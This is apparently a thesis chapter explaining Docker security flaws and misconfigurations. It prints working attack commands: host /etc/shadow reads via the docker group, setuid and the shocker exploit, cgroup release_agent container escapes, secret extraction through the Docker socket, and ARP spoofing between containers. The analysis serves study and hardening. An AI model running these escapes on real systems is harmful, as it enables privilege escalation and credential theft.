\chapter{Known Vulnerabilities \& Misconfigurations in Docker}
\todo[inline]{Introduction: link to next chapter}
In this chapter we will look at Docker from a vulnerability analysis perspective. First we will look conceptually at Docker and security by examining the attack surface of Docker on an host and the various attacker models that come with it.
We then look at some interesting, practical examples of security problems of Docker. These are split into vulnerabilities and misconfigurations.

\hfill

Vulnerabilities and misconfigurations are both security problems, but they differ in who made the mistake. A \emph{vulnerability} is a problem in a program itself. For example, a buffer overflow is a clear vulnerability. The problem lies solely in the program itself. To fix it, the code of the program needs to be changed. \emph{Misconfigurations}, on the other hand, are security problems that come from wrong usage of a program. The program is incorrectly configured and that creates a situation that might be exploitable to an attacker. For example, a world-readable file containing passwords is a misconfiguration. To fix a misconfiguration, the user should change the configuration of the problem. The developers of the program can only recommend users to configure it correctly (and have documentation on how to do it).

\pagebreak

\section{Attack Surface \& Models}
\todo[inline]{Link scenarios to CVSS}

Because Docker is more of an ecosystem than a single running process, it has quite a large attack surface. This attack surface consists of multiple attacker models.

\hfill

Lets take a look at the following scenarios and images showing the attacker models.
We see the following processes pictured in the images.
\begin{enumerate}
    \item[A)] Standard (privileged) process running directly on the host.
    \item[B)] Standard unprivileged process running directly on the host.
    \item[C)] Process running in a Docker container.
    \item[D)] Similar to C.
\end{enumerate}

\subsection{Container Escape}
One of the most common type of vulnerability (and sometimes misconfiguration) is the possibility for a process running in a container to escape the container and access data (i.e.\ execute commands) on the host.
\begin{figure}[ht]
    \centering
    \includegraphics[width=.9\linewidth]{resources/images/attack-scenario-3.png}
    \caption{}\label{fig:container-escape}
    \medskip
    \small
    A process (Process C) running inside a container accessing data on the host (that it should not be able to access), in this case Process B.
\end{figure}

\hfill

An example attack scenario would be a company that offers a PaaS (Platform as a Service) products that allows customers to run dockers on their infrastructure\footnote{This is actually quite common nowadays. All major computing providers offer such a service.}. If it is possible for the attacker to submit a Docker image that escapes the container and access the underlying infrastructure, they could access other containers or even other internal resources. That would, obviously, be a very big problem for that company.

\hfill

A lot of the known container escapes are possible because the container can access some files on the host. For example, if Docker mounts some necessary directories in \lstinline{/proc} by default (which would be a vulnerability) or if sensitive data is mounted as a volume (which would be a misconfiguration).

\hfill

As noted before, because a container uses the same kernel and resources as the host, an exploit granting root can be just as devastating run inside as outside of the docker, because the target kernel and resources are the same. CVE--2016--5195(Dirty Cow)\footnote{\url{https://dirtycow.ninja/}} is a good example of an exploit that allows container escapes\cite{Dirty-Cow-Escape}.

It should also be noted that an exploit that allows someone to escape from a Linux \lstinline{namespace} is essentially a container escape exploit. CVE--2017--7308\cite{CVE-2017-7308} is a good example of this.

\subsection{Docker Daemon Attack \& Container Attack}
If user permissions are incorrectly configured, an unprivileged user can gain or access container resources they should not be able to access using the Docker Daemon. This is shown by \autoref{fig:docker-daemon-attack} and \autoref{fig:container-attack}.

\begin{figure}[ht]
    \centering
    \includegraphics[width=.9\linewidth]{resources/images/attack-scenario-1.png}
    \caption{}\label{fig:docker-daemon-attack}
    \medskip
    \small
    An unprivileged process B accessing privileged data (in the image process A) using the Docker Daemon.
\end{figure}

\begin{figure}[ht]
    \centering
    \includegraphics[width=.9\linewidth]{resources/images/attack-scenario-2.png}
    \caption{}\label{fig:container-attack}
    \medskip
    \small
    An unprivileged process B accessing data in a Docker container.
\end{figure}

\hfill

The Docker Daemon runs as \lstinline{root} (An experimental rootless mode is being worked on\footnote{\url{https://github.com/docker/engine/blob/master/docs/rootless.md}}). Because Docker has many (powerful) features, this allows any user with permissions to use Docker to practically gain \lstinline{root} privileges. This is why the Docker documentation explicitly states ``only trusted users should be allowed to control your Docker daemon''\footnote{\url{https://docs.docker.com/engine/security/security/}}.

\hfill

A real life example of the impact of incorrectly configured Docker permissions happened a few years back with one of the courses in the Computing Science curriculum (of the Radboud). A teacher wanted to teach students about containerization and modern software development. He asked the IT department to install Docker on all student workstations and add all the students in the course to \lstinline{docker} group (giving them full permissions to run Docker). This gave every student the equivalent of \lstinline{root} rights on every workstation.

\subsection{Container to Container Attack}
Containers should not only be isolated from the host, but also from other containers. This allows multiple containers with sensitive data to be run on the same host without them being to access each other's data. In Docker this is not always the case.

\begin{figure}[ht]
    \centering
    \includegraphics[width=.9\linewidth]{resources/images/attack-scenario-4.png}
    \caption{}\label{fig:container-to-container-attack}
    \medskip
    \small
    A process (Process C) running inside a container, accessing data in another container (process D).
\end{figure}

By default all Docker containers are added to the same bridge network. This means that (by default) all Docker containers can reach each other over the network. This can lead to very dangerous situations. Lets say, for example, I run a database in a Docker container. I do not set a password for the database admin user, because I believe that the database is fully isolated (including the network) because of Docker. Any other Docker on that system is able to access the full database.


\subsection{Deployment \& Development Pipelines}
One of the biggest usages of Docker is automating part of the deployment and development process. Many developers use Continuous Integration and Deployment systems to automatically build Docker images that they then automatically pull and run on their production environments. This level of automation allows for very rapid software development.

That automation does have a negative side. It removes scrutiny from the deployment pipeline. If an attacker is able to compromise a link in the chain, they will be able to create their own malicious images that will be automatically run. Without proper monitoring of the full pipeline, such an attack can go unnoticed, because the system is designed to not need any human interaction.

\subsection{The impact of Docker on existing vulnerabilities}
A Docker container isolates software from the host, but does not change it. This means that vulnerabilities in software are not affected by Dockerizing that software. However, the impact of those vulnerabilities is decreased, because the vulnerability exists in an isolated environment.

If, for example, there exists a RCE (remote code execution) vulnerability in Wordpress. Running Wordpress in a Docker container does not fix the vulnerability. An attacker is still able to exploit it. But that attacker is not able to access the host system, because the exploited software is isolated from the host system because of Docker.

\subsection{Protection Mechanisms}
\todo[inline]{SELinux}
\todo[inline]{AppArmor}
\todo[inline]{Secure Computing Mode Profiles}
\todo[inline]{Capabilities}
\todo[inline]{\url{https://github.com/genuinetools/bane}}
\todo[inline]{CIS Benchmark Docker protections}
\todo[inline]{Docker Content Trust Signature Verification}
\todo[inline]{Wrapper scripts like docker-compose}
\todo[inline]{\url{https://docs.docker.com/engine/security/security/}}
\todo[inline]{\href{http://www.projectatomic.io/blog/2016/01/how-to-run-a-more-secure-non-root-user-container/}{How to Run a More Secure Non-Root User Container}}

\section{Vulnerabilities}
\todo[inline]{CVSS}
\todo[inline]{Link to attack scenario}

In the \hyperref[appendix:CVE-List]{appendix} you can find a list of all the Docker related vulnerabilities I have looked at.

\subsection{\texorpdfstring{\lstinline{waitid()}}{waitid()} Container Escape (CVE--2017--5123)}
\todo[inline]{CVE--2017--14954}
\todo[inline]{Kernel exploit}

\subsection{Alpine Image Root Password (CVE--2019--5021)}
\begin{lstlisting}
$ docker run -it --rm alpine:3.5 cat /etc/shadow
root:::0:::::
\end{lstlisting}

\begin{lstlisting}
(host)$ docker run -it --rm alpine:3.5 sh
(cont)# apk add --no-cache linux-pam shadow
...
(cont)# adduser test
...
(cont)# su test
Password:
(cont)$ su root
(cont)#
\end{lstlisting}

This vulnerability has a CVSS score of 9.8 (and a 10 in CVSS 2)\footnote{\url{https://nvd.nist.gov/vuln/detail/CVE-2019-5021}}. The CVSS scores are out of 10, meaning this is seen as an extremely high-risk vulnerability. But in actuality, this vulnerability is only risky in very specific cases. "Empty \lstinline{root} password" sounds very dangerous, but it really is not that dangerous in an isolated container that runs root by default. Only in the very specific case that a process in a container runs as a non-root user and their is some vulnerability or misconfiguration that allows \lstinline{root} to escape the container and an attacker can get control of the process in the container is this dangerous. In other words, this vulnerability is actually not likely to be used in the wild and most likely needs to be combined with another vulnerability or misconfiguration to be able to do damage.

\subsection{\texorpdfstring{\lstinline{runC}}{runC} Container Escape (CVE--2019--5736)}
\todo[inline]{\href{https://blog.bssi.fr/escape-from-a-docker-container-explanation-of-the-last-patched-vulnerability-on-docker-18-09-2-cve-2019-5736/\#overwrite_runc}{Escape from a Docker container: Explanation of the last patched vulnerability on docker}}
\todo[inline]{\href{https://aws.amazon.com/blogs/compute/anatomy-of-cve-2019-5736-a-runc-container-escape/}{Anatomy of CVE-2019-5736: A runc container escape!}}

\section{Misconfigurations}
\todo[inline]{\url{https://www.katacoda.com/courses/docker-security/}}
\todo[inline]{Map to CIS Benchmark}
\todo[inline]{Does CIS cover everything?}
\todo[inline]{\href{https://www.nccgroup.trust/uk/our-research/abusing-privileged-and-unprivileged-linux-containers/}{Abusing Privileged and Unprivileged Linux Containers}}
\todo[inline]{\href{https://www.nccgroup.trust/uk/our-research/understanding-and-hardening-linux-containers/}{Understanding and Hardening Linux Containers}}
\todo[inline]{\href{https://0x00sec.org/t/securing-docker-containers/16913}{Securing Docker Containers}}
\todo[inline]{\href{https://www.reddit.com/r/docker/comments/dkgtfv/10_docker_image_security_best_practices/}{10 Docker Image Security Best Practices}}
\todo[inline]{\url{http://training.play-with-docker.com/security-seccomp/}}
\todo[inline]{Usage of third party Docker images}
\todo[inline]{\href{https://forums.grsecurity.net/viewtopic.php?f=7&t=2522}{False Boundaries and Arbitrary Code Execution}}
\todo[inline]{Link to attack scenarios}

\subsection{Docker Permissions}
A very common (and most notorious) misconfiguration is giving unprivileged users access to Docker. This is very dangerous because this allows the unprivileged users to access all files as \lstinline{root}. The Docker documentation says\cite{Docker-Daemon-Attack-Surface}:
\begin{quote}
First of all, only trusted users should be allowed to control your Docker daemon. This is a direct consequence of some powerful Docker features. Specifically, Docker allows you to share a directory between the Docker host and a guest container; and it allows you to do so without limiting the access rights of the container. This means that you can start a container where the /host directory is the / directory on your host; and the container can alter your host filesystem without any restriction.
\end{quote}

In short, because the Docker Daemon runs as root, if an user adds a directory as a volume to a container, that file is accessed as root. There are two common ways for unprivileged users to access Docker. They are either part of the \lstinline{docker} group or the \lstinline{docker} binary has the \lstinline{setuid} bit set.

\subsubsection{\texorpdfstring{\lstinline{docker}}{docker} group}
Every user in the \lstinline{docker} group is allowed to use Docker. This allows simple access management of Docker usage. Sometimes the system administrator of a network does not want to do proper access management and adds every user to the \lstinline{docker} group, because that allows everything to run smoothly. This misconfiguration, however allows every user to access every file on the system.

\hfill

Lets say we want the password hash of user \lstinline{admin} on a system where we do not have \lstinline{sudo} privileges, but we are a member of the \lstinline{docker} group.

\begin{lstlisting}[caption={Docker \lstinline{group} exploit example},captionpos=b]
(host)$ sudo -v
Sorry, user unpriv may not run sudo on host.
(host)$ groups | grep -o docker
docker
(host)$ docker run -it --rm --volume=/:/host ubuntu:latest bash
(cont)# grep admin /host/etc/shadow
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

We start by checking our permissions. We do not have \lstinline{permissions}, but we are a member of the \lstinline{docker} group. This allows us to create a container with \lstinline{/} mounted as volume and access any file as root. This includes the file storing password hashes \lstinline{/etc/passwd}.

\subsubsection{\texorpdfstring{\lstinline{setuid}}{setuid} bit}
Another way system administrators might skip proper access management is to set the \lstinline{setuid} bit on the \lstinline{docker} binary.

\hfill

The \lstinline{setuid} bit is a permission bit in Unix, that allows users to run binaries as the owner (or group) of the binary instead of themselves.
This is very useful in specific cases. For example, users should be able to change their own passwords, but should not be able to read password hashes of other users. That is why the \lstinline{passwd} binary has the \lstinline{setuid} bit set. A user can change their password, because \lstinline{passwd} is run as \lstinline{root} (the owner of \lstinline{passwd}) and, of course, \lstinline{root} is able to read and write the password file. In this case the protection and security comes from the fact that \lstinline{passwd} asks for the user's password itself and only writes to specific entries in the password file.

\hfill

If a system is misconfigured by having the \lstinline{setuid} bit set for the \lstinline{docker} binary, a user will be able to execute Docker as \lstinline{root} (the owner of \lstinline{docker}). Just like before, we can easily recreate this attack.

\begin{lstlisting}[caption={Docker \lstinline{setuid} exploit example},captionpos=b]
(host)$ sudo -v
Sorry, user unpriv may not run sudo on host.
(host)$ groups | grep -o docker
(host)$ ls -halt /usr/bin/docker
-rwsr-xr-x 1 root root 85M okt 18 17:52 /usr/bin/docker
(host)$ docker run -it --rm --volume=/:/host ubuntu:latest bash
(cont)# grep admin /host/etc/shadow
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

We now see that we are not a part of the \lstinline{docker} group, but we can still run \lstinline{docker} because the \lstinline{setuid} bit is set.

\subsection{The -{}-privileged flag}

Docker has a special privileged mode\cite{Docker-in-Docker-blog}. This mode is enabled if a container is created with the \lstinline{--privileged} flag and it enables access to all host devices and kernel capabilities. This is a very powerful mode and enables some very useful features (e.g\ building Docker images inside a Docker container). But it is also very dangerous as those kernel features allow an attacker inside the container to escape and access the host.

\hfill

A simple example of this, is using a feature in \lstinline{cgroups}\cite{CGroup-Docs}. If a \lstinline{cgroup} does not contain any processes anymore, it is released. It is possible to specify a command that should be run in case that happens (called a \lstinline{release_agent}). It is possible to define such a \lstinline{release_agent} in a privileged docker. If the \lstinline{cgroup} is released, the command is run on the host\cite{TrailOfBits-Docker-Escape}.

\hfill

We can look at a proof of concept of this attack developed by security researcher Felix Wilhelm\cite{Felix-Wilhem-Tweet}.
\begin{lstlisting}[caption={Docker escape using \lstinline{cgroups} (privileged)},captionpos=b]
(host)$ docker run -it --rm --privileged ubuntu:latest bash
(cont)# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
(cont)# mkdir -p $d/w;echo 1 >$d/w/notify_on_release
(cont)# t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
(cont)# touch /o; echo $t/c >$d/release_agent;printf '#!/bin/sh\nps >'"$t/o" >/c;
(cont)# chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
\end{lstlisting}

This proof of concept creates a new \lstinline{cgroup}, sets a \lstinline{release_agent} and releases it. In this case the \lstinline{release_agent} runs \lstinline{ps} and writes the output to the root of the container.


\subsection{Capabilities}
To perform a privileged Linux kernel action, the process needs the relevant \lstinline{capability}. \lstinline{capabilities}\footnote{See the \lstinline{man page} of \lstinline{capbilities}}
 are a Linux feature that allow specific privileged actions (e.g.\ sending raw packets). A process running as \lstinline{uid} 0(\lstinline{root}) has all capabilities.
 Processes in a Docker container are given minimum capabilities, but if needed it is possible to add extra capabilities using the \lstinline{--cap-add} argument. It is also possible to drop unnecessary capabilities using the \lstinline{--cap-drop}. In privileged mode, the container has all capabilities.

\hfill

Giving containers extra capabilities, gives the container permission to perform certain actions. Some of these actions allow Docker escapes.

\subsubsection{\texorpdfstring{\lstinline{SYS_ADMIN}}{SYS_ADMIN}}
The Docker escape by Felix Wilhelm\cite{Felix-Wilhem-Tweet} needs to be run in privileged mode to work, but it can be rewritten to only need the permission to run \lstinline{mount}\cite{TrailOfBits-Docker-Escape}, which is granted by the \lstinline{SYS_ADMIN} capability.

\begin{lstlisting}[caption={Docker escape using \lstinline{SYS_ADMIN}},captionpos=b]
(host)$ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu /bin/bash
(cont)# mkdir /tmp/cgrp
(cont)# mount -t cgroup -o rdma cgroup /tmp/cgrp
(cont)# mkdir /tmp/cgrp/x
(cont)# echo 1 > /tmp/cgrp/x/notify_on_release
(cont)# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
(cont)# echo "$host_path/cmd" > /tmp/cgrp/release_agent
(cont)# echo '#!/bin/sh' > /cmd
(cont)# echo "ps aux > $host_path/output" >> /cmd
(cont)# chmod a+x /cmd
(cont)# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
(cont)# cat /output
\end{lstlisting}

Unlike before, instead of relying on \lstinline{--privilege} to give us write access to a \lstinline{cgroup}, we just need to mount our own. This gives us exactly the same scenario as before. We use a \lstinline{release_agent} to run code on the host. The only difference being that we have to do some manual work ourselves.

\subsubsection{\texorpdfstring{\lstinline{CAP_DAC_READ_SEARCH}}{CAP_DAC_READ_SEARCH}}
Before Docker 1.0.0 \lstinline{CAP_DAC_READ_SEARCH} was added to the default capabilities that a containers are given. But this capability allows a process to escape its the container\cite{Docker-Shocker-Seclists}. To demonstrate this attack a proof of concept exploit was released\cite{Docker-Shocker}\cite{Docker-Shocker-Analysis}. This exploit has been released in 2014, but still works on containers with the \lstinline{CAP_DAC_READ_SEARCH} capability.

\hfill

\begin{lstlisting}[caption={Docker escape using \lstinline{CAP_DAC_READ_SEARCH}},captionpos=b]
(host)$ cd /tmp
(host)$ curl -O http://stealth.openwall.net/xSports/shocker.c
(host)$ sed -i "s/\/.dockerinit/\/tmp\/a.out/" shocker.c
(host)$ cc -Wall -std=c99 -O2 shocker.c -static
(host)$ docker run --rm -it --cap-add="CAP_DAC_READ_SEARCH" -v "/tmp:/tmp" busybox sh
(cont)# /tmp/a.out
...
[!] Win! /etc/shadow output follows:
...
admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
\end{lstlisting}

The exploit needs a file with a file handle on the host system to properly work. Instead of the default \lstinline{/.dockerinit} (which is no longer created in newer versions of Docker) we use the exploit file itself \lstinline{/tmp/a.out}. We start a container with the \lstinline{CAP_DAC_READ_SEARCH} capability and run the exploit. It prints the password file of the host (\lstinline{/etc/shadow}).

\subsection{Docker Engine API}
The Docker Daemon runs a RESTful\footnote{\url{https://restfulapi.net/}} API that is used to communicate with the Docker Daemon. For example, when an user executes a Docker client command, it actually makes a request to the API. By default the API listens on a UNIX socket accessible through \lstinline{/var/run/docker.sock}, but it also possible to make it listen on a port. This makes it possible for anybody in the \lstinline{docker} group (and \lstinline{root}) to make HTTP requests. For example the following commands (to see all containers) produce the same output (albeit in a different format). The first one is a command using the Docker client and the second is a HTTP request (using \lstinline{curl}\footnote{\url{https://curl.haxx.se/}}).
\begin{lstlisting}[caption={Docker client and Socket},captionpos=b]
(host)$ docker ps -a
...
(host)$ curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' "http://localhost/containers/json?all=1"
...
\end{lstlisting}

\hfill

In some cases, it might be possible to access the API when it is not possible to access the Docker client, but because API access gives the same exact possibilities as having access to the Docker client, this is very dangerous\cite{The-Dangers-Of-Docker-Sock}.
However, giving containers access to the API (by adding the socket as a volume) is a common practice, because it allows containers to monitor and analyse other containers.

\subsubsection{Container Escapes}
\todo[inline]{\href{https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html}{Escaping the Whale: Things you probably shouldn't do with Docker (Part 1)
}}
\todo[inline]{\href{https://blog.secureideas.com/2018/08/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-2.html}{Escaping the Whale: Things You Probably Shouldn't Do With Docker (part 2)
}}

\subsubsection{Finding Secrets}
\begin{lstlisting}[caption={Example extract secrets using the Docker API},captionpos=b]
(host)$ docker run --name database -e POSTGRES_PASSWORD=thisshouldbesecret -d postgres
...
(host)$ docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock:ro ubuntu:latest bash
(cont)# apt update
...
(cont)# apt install curl jq
...
(cont)# curl --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' "http://localhost/containers/database/json" | jq -r '.Config.Env'
[
  "POSTGRES_PASSWORD=thisshouldbesecret",
  "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/postgresql/12/bin",
  "GOSU_VERSION=1.11",
  "LANG=en_US.utf8",
  "PG_MAJOR=12",
  "PG_VERSION=12.0-2.pgdg100+1",
  "PGDATA=/var/lib/postgresql/data"
]
\end{lstlisting}

\subsubsection{Remote Access}
It is also possible to make the API listen on a TCP port. Ports 2375 and 2376 are usually used for HTTP and HTTPS communication, respectively. This, however, does bring all the extra complexity of TCP sockets with it. If not configured to only listen on \lstinline{localhost}, this gives every host on the network access to Docker (which might be desirable behavior). If the host is directly accessible by the internet, it gives everybody access to the full capabilities of Docker on the host. An attacker can exploit this by starting malicious containers\cite{Metasploit-Unprotected-TCP-Socket}.

\hfill

A malicious actor misused this feature in May 2019. He used Shodan\footnote{A search engine to search for systems connected to the internet.}\footnote{\url{https://www.shodan.io/}} to find unprotected publicly accessible Docker APIs and start containers that mine Monero\footnote{A cryptocurrency that focuses on privacy.} and find other hosts to infect\cite{zoolu2-bot-1807}\cite{zoolu2-bot-1809}\cite{zoolu2-bot-1853}.

\subsection{Vulnerable volumes}
\todo[inline]{Wrong volumes: / or /proc}

\subsection{Readable Configuration Files}
Because setting up environments with Docker can be quite complex, many Docker users use programs to save all necessary Docker settings to configuration files (e.g. \lstinline{docker-compose}) to remove the need of repeating complex steps and configuration. These configuration files often contain very sensitive information. If the permissions on these files are configured badly, users that should not be able to read the files, might be able to read the files.

Too very common files that contain sensitive information are \lstinline{.docker/config.json} and \lstinline{docker-compose.yaml} files.

\subsubsection{\texorpdfstring{\lstinline{.docker/config.json}}{.docker/config.json}}
When pushing images to a registry, users need to login to the registry to authenticate themselves.
It would be quite annoying to login every time an user wants to push and image. That is why \lstinline{.docker/config.json} caches those credentials. These are stored in base64 encoding in the home directory of the user by default\footnote{\url{https://docs.docker.com/engine/reference/commandline/login/}}. An attacker with access to the file, can push malicious Docker images\cite{Docker-Credentials-Metasploit}.

\subsubsection{\texorpdfstring{\lstinline{docker-compose.yaml}}{docker-compose.yaml}}
\lstinline{docker-compose.yaml} files often contain secrets (e.g.\ passwords and API keys), because all information that should be passed to a container is saved in the \lstinline{docker-compose.yaml} file.

\subsection{ARP Spoofing}
By default all Docker containers are added to the same bridge network. This means they are able to reach each other. By default Docker containers also receive the \lstinline{CAP_NET_RAW} capability, which allows them to create raw packets. This means that by default, containers are able to ARP spoof other containers.

\hfill

Lets take a look at how this in a practical example. Lets say we have three containers. One container will ping another container. The third "malicious" container wants to intercept the \lstinline{ICMP} packets.

We start three Docker containers using the \lstinline{ubuntu:latest} image (which is the same as \lstinline{ubunut:bionic-20191029} at the time of writing). They have the following names IPv4 addresses and MAC addresses:
\begin{itemize}
    \item \lstinline{victim0}: \lstinline{172.17.0.2} and \lstinline{02:42:ac:11:00:02}
    \item \lstinline{victim1}: \lstinline{172.17.0.3} and \lstinline{02:42:ac:11:00:03}
    \item \lstinline{attacker}: \lstinline{172.17.0.4} and \lstinline{02:42:ac:11:00:04}
\end{itemize}

We use \lstinline{vic0}, \lstinline{vic1} and \lstinline{atck} instead of \lstinline{cont} to indicate in which container a command is executed.

\begin{lstlisting}[caption={Docker container ARP spoof},captionpos=b]
(host)$ docker run --rm -it --name=victim0 --hostname=victim0 ubuntu:latest /bin/bash
(vic0)# apt update
...
(vic0)# apt install net-tools iproute2 iputils-ping
...
(host)$ docker run --rm -it --name=victim1 --hostname=victim1 ubuntu:latest /bin/bash
(host)$ docker run --rm -it --name=attacker --hostname=attacker ubuntu:latest /bin/bash
(atck)# apt update
...
(atck)# apt install dsniff net-tools iproute2 tcpdump
...
(atck)# arpspoof -i eth0 -t 172.17.0.2 172.17.0.3
...
(vic0)# arp
arp
172.17.0.3 ether 02:42:ac:11:00:04 C eth0
...
172.17.0.4 ether 02:42:ac:11:00:04 C eth0
(vic0)# ping 172.17.0.3
...
(atck)# tcpdump -vni eth0 icmp
...
10:16:18.368351 IP (tos 0x0, ttl 63, id 52174, offset 0, flags [DF], proto ICMP (1), length 84)
    172.17.0.2 > 172.17.0.3: ICMP echo request, id 898, seq 5, length 64
10:16:18.368415 IP (tos 0x0, ttl 64, id 8188, offset 0, flags [none], proto ICMP (1), length 84)
    172.17.0.3 > 172.17.0.2: ICMP echo reply, id 898, seq 5, length 64
...
\end{lstlisting}

We first start three containers and install dependencies. We then start to poison the ARP table of \lstinline{victim0}. We can observe this by looking at the ARP table of \lstinline{victim0} (with the \lstinline{arp} command). We see that the entries for \lstinline{172.17.0.3} and \lstinline{172.17.0.4} are the same (\lstinline{02:42:ac:11:00:04}). If we then start pinging \lstinline{victim1} from \lstinline{victim0} and looking at the \lstinline{ICMP} traffic on \lstinline{attacker}, we see that the \lstinline{ICMP} packets are routed through \lstinline{attacker}.

